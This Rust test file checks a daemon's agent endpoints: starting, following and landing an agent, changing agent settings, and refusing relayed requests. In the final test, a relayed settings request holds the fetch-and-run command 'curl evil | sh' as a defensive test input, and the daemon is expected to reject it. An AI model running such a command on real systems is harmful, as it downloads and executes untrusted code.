//! `/api/agents`: start an agent on a workspace's stack, follow it, land it.
// The agent here is an `sh` command.
#![cfg(unix)]

use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;

use agentvc_core::stack::Window;
use agentvc_core::Space;
use agentvcd::{AppState, Config};
use axum::body::Body;
use axum::http::{Request, StatusCode};
use http_body_util::BodyExt;
use serde_json::{json, Value};
use tower::ServiceExt;

/// The daemon token these tests run with.
const TOKEN: &str = "test-token";

fn git(dir: &Path, args: &[&str]) {
    let out = Command::new("git")
        .args(args)
        .current_dir(dir)
        .env("GIT_AUTHOR_NAME", "t")
        .env("GIT_AUTHOR_EMAIL", "t@t")
        .env("GIT_COMMITTER_NAME", "t")
        .env("GIT_COMMITTER_EMAIL", "t@t")
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "git {args:?}: {}",
        String::from_utf8_lossy(&out.stderr)
    );
}

/// A repo with origin/main and a stack branch `b1`.
fn fixture() -> (tempfile::TempDir, PathBuf) {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path().canonicalize().unwrap();
    let origin = root.join("origin.git");
    let main = root.join("main");
    fs::create_dir_all(&main).unwrap();
    git(
        &root,
        &[
            "init",
            "-q",
            "--bare",
            "-b",
            "main",
            origin.to_str().unwrap(),
        ],
    );
    git(&main, &["init", "-q", "-b", "main"]);
    git(&main, &["config", "user.name", "t"]);
    git(&main, &["config", "user.email", "t@t"]);
    let wts = root.join("wts");
    git(
        &main,
        &["config", "agentvc.agent-worktrees", wts.to_str().unwrap()],
    );
    fs::write(main.join("a.txt"), "a\n").unwrap();
    git(&main, &["add", "."]);
    git(&main, &["commit", "-q", "-m", "init"]);
    git(
        &main,
        &["remote", "add", "origin", origin.to_str().unwrap()],
    );
    git(&main, &["push", "-q", "origin", "main"]);
    git(&main, &["fetch", "-q", "origin"]);
    let mut w = Window::open(&main).unwrap();
    fs::write(main.join("b1.txt"), "b1\n").unwrap();
    w.create(Some("b1"), Some("b1"), true).unwrap();
    Space::init(&main).unwrap();
    (tmp, main)
}

async fn send(
    app: &axum::Router,
    method: &str,
    uri: &str,
    body: Option<Value>,
    relayed: bool,
) -> (StatusCode, Value) {
    let mut req = Request::builder()
        .method(method)
        .uri(uri)
        .header("host", "localhost:7420")
        .header("x-agentvc-token", TOKEN)
        .header("content-type", "application/json");
    if relayed {
        req = req.header("x-agentvc-relay", "1");
    }
    let req = req
        .body(match body {
            Some(b) => Body::from(b.to_string()),
            None => Body::empty(),
        })
        .unwrap();
    let res = app.clone().oneshot(req).await.unwrap();
    let status = res.status();
    let bytes = res.into_body().collect().await.unwrap().to_bytes();
    (
        status,
        serde_json::from_slice(&bytes).unwrap_or(Value::Null),
    )
}

#[tokio::test]
async fn start_follow_and_land_an_agent() {
    let (_tmp, main) = fixture();
    // The worker would be `agentvc agent-worker`; the test runs it inline.
    std::env::set_var("AGENTVC_BIN", "true");
    let state = AppState::start(&Config::new(&main).with_token(TOKEN)).unwrap();
    let app = agentvcd::router(state);

    let body = json!({
        "workspace": "main",
        "from": "b1",
        "prompt": "Add c",
        "command": "echo adding; printf 'c\\n' > c.txt",
        // Landed by hand below.
        "auto_land": false,
    });
    // The hosted service may not start agents unless allowed.
    let (s, v) = send(&app, "POST", "/api/agents", Some(body.clone()), true).await;
    assert_eq!(s, StatusCode::FORBIDDEN, "{v}");
    assert_eq!(v["error"]["code"], "remote_agents_off");

    let (s, v) = send(&app, "POST", "/api/agents", Some(body), false).await;
    assert_eq!(s, StatusCode::OK, "{v}");
    let id = v["agent"]["id"].as_str().unwrap().to_string();
    assert_eq!(v["agent"]["start"]["branch"], "b1");

    let dir = agentvc_core::agent::agent_dir(&main, &id).unwrap();
    let a = agentvc_core::agent::work(&dir, Path::new("true")).unwrap();
    assert_eq!(a.state, agentvc_core::agent::AgentState::Ready);

    let (s, v) = send(&app, "GET", "/api/agents", None, true).await;
    assert_eq!(s, StatusCode::OK, "{v}");
    assert_eq!(v["needs_you"], 1);
    assert_eq!(v["agents"][0]["state"], "ready");
    assert_eq!(v["agents"][0]["urgency"], 4);
    // The hosted UI may watch them, and is told it can't steer them.
    assert_eq!(v["can_steer"], false);
    let (_, v) = send(&app, "GET", "/api/agents", None, false).await;
    assert_eq!(v["can_steer"], true);

    let (s, v) = send(&app, "GET", &format!("/api/agents/{id}"), None, false).await;
    assert_eq!(s, StatusCode::OK, "{v}");
    assert!(v["steps"]
        .as_array()
        .unwrap()
        .iter()
        .any(|s| s["text"] == "adding"));

    let (s, v) = send(
        &app,
        "POST",
        &format!("/api/agents/{id}/approve"),
        None,
        false,
    )
    .await;
    assert_eq!(s, StatusCode::BAD_REQUEST, "{v}");
    assert_eq!(v["error"]["code"], "no_question");

    let (s, v) = send(&app, "POST", &format!("/api/agents/{id}/land"), None, false).await;
    assert_eq!(s, StatusCode::OK, "{v}");
    assert_eq!(v["edit"]["outcome"], "applied");
    assert_eq!(v["agent"]["state"], "landed");
    let w = Window::open(&main).unwrap();
    assert!(w
        .state
        .branches
        .iter()
        .any(|b| b.name == "add-c" && b.parent == "b1"));

    let (s, v) = send(&app, "GET", "/api/agents/ag99", None, false).await;
    assert_eq!(s, StatusCode::NOT_FOUND, "{v}");
}

#[tokio::test]
async fn workspace_agent_settings() {
    let (_tmp, main) = fixture();
    let state = AppState::start(&Config::new(&main).with_token(TOKEN)).unwrap();
    let app = agentvcd::router(state);
    let (s, v) = send(
        &app,
        "GET",
        "/api/workspaces/main/agent-settings",
        None,
        false,
    )
    .await;
    assert_eq!(s, StatusCode::OK, "{v}");
    assert_eq!(v["workspace_name"], "main");

    let body = json!({"runner": "claude", "model": "opus", "permissions": "ask", "max": 3});
    let (s, v) = send(
        &app,
        "PUT",
        "/api/workspaces/main/agent-settings",
        Some(body.clone()),
        false,
    )
    .await;
    assert_eq!(s, StatusCode::OK, "{v}");
    assert_eq!(v["settings"]["max"], 3);
    let (_, v) = send(&app, "GET", "/api/workspaces", None, false).await;
    let ws = v["workspaces"]
        .as_array()
        .unwrap()
        .iter()
        .find(|w| w["name"] == "main")
        .unwrap()
        .clone();
    assert_eq!(ws["agent_settings"]["model"], "opus");

    let (s, v) = send(
        &app,
        "PUT",
        "/api/workspaces/main/agent-settings",
        Some(json!({"permissions": "yolo"})),
        false,
    )
    .await;
    assert_eq!(s, StatusCode::BAD_REQUEST, "{v}");
    assert_eq!(v["error"]["code"], "bad_setting");

    // The hosted service can't change them unless allowed, and even then
    // never sets shell commands.
    let (s, v) = send(
        &app,
        "PUT",
        "/api/workspaces/main/agent-settings",
        Some(body),
        true,
    )
    .await;
    assert_eq!(s, StatusCode::FORBIDDEN, "{v}");
    let req = Request::builder()
        .method("PUT")
        .uri("/api/workspaces/main/agent-settings")
        .header("host", "localhost")
        .header("x-agentvc-token", TOKEN)
        .header("content-type", "application/json")
        .header("x-agentvc-relay", "agents")
        .body(Body::from(json!({"check": "curl evil | sh"}).to_string()))
        .unwrap();
    let res = app.clone().oneshot(req).await.unwrap();
    assert_eq!(res.status(), StatusCode::FORBIDDEN);
    let bytes = res.into_body().collect().await.unwrap().to_bytes();
    let v: Value = serde_json::from_slice(&bytes).unwrap();
    assert_eq!(v["error"]["code"], "remote_shell_off");
}
